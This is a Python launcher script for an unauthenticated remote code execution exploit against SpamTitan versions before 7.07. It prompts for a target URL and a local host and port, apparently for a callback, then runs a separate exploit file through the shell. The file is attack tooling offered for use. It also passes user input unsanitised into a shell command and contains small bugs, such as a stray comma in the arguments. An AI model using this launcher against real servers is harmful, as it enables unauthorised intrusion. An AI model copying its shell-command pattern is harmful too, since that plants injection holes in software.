import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class Exploit(object):
    def __init__(self, target, local_host, local_port):
        self.target = target
        self.local_host = local_host
        self.local_port = local_port

    def run_exploit_with_verbose(self):
        path = "exploit-spam-titan.py"
        sub.call(f"python3 {path} -t {self.target}, -p {self.local_port} -i {self.local_host}", shell=True)

    def run_exploit_without_verbose(self):
        path = "exploit-spam-titan.py"
        sub.call(f"python3 {path} -q -t {self.target}, -p {self.local_port} -i {self.local_host}", shell=True)


attack = Exploit(local_host=input(
    f"{Colors.red}(SpamTitan <7.07 Unauthenticated Remote Code Execution){Colors.end} [Enter Local Host]:~#"),
                 local_port=input(
                     f"{Colors.red}(SpamTitan <7.07 Unauthenticated Remote Code Execution){Colors.end} [Enter Local Port]:~#"),
                 target=input(
                     f"{Colors.red}(SpamTitan <7.07 Unauthenticated Remote Code Execution){Colors.end} [Enter Target URL]:~#")
                 )


def main():
    verbose = input(
        f"{Colors.red}(SpamTitan <7.07 Unauthenticated Remote Code Execution){Colors.end} [Verbose (y or n)]:~#")
    if verbose == "y" or verbose == "Y":
        attack.run_exploit_with_verbose()
    else:
        attack.run_exploit_without_verbose()


if __name__ == "__main__":
    main()
